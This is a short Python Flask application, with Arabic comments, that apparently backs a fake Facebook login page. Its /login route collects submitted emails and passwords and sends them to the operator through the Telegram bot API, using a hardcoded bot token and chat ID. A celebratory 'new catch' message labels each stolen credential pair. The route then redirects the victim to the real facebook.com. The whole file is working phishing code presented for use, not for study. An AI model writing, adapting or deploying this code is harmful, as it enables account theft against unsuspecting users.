from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

# حط التوكن والايدي تاعك هنا
BOT_TOKEN = "7547614066:AAH3_M0L5v0uM0_u3Ym0-u9Z" 
CHAT_ID = "5304381534" 

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    msg = f"🔥 صيدة جديدة يا فارس! 🔥\n\n📧 الإيميل: {email}\n🔑 الباسورد: {password}"
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
    
    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
